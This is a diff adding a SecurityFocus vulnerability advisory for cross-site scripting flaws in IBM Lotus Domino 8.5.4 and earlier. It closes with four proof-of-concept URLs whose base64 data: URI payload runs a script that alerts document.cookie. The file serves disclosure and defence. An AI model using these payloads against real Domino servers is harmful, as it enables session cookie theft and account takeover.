@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/58715/info
+
+IBM Lotus Domino is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+IBM Lotus Domino 8.5.4 and prior are vulnerable. 
+
+http://www.example.com/mail/x.nsf/CalendarFS?OpenFrameSet&Frame=NotesView&Src=data:text/html; base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B
+
+http://www.example.com/mail/x.nsf/WebInteriorCalendarFS?OpenFrameSet&Frame=NotesView&Src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B
+
+http://www.example.com/mail/x.nsf/ToDoFS?OpenFrameSet?OpenFrameSet&Frame=NotesView&Src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B
+
+http://www.example.com/mail/x.nsf/WebInteriorToDoFS?OpenFrameSet&Frame=NotesView&Src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B 
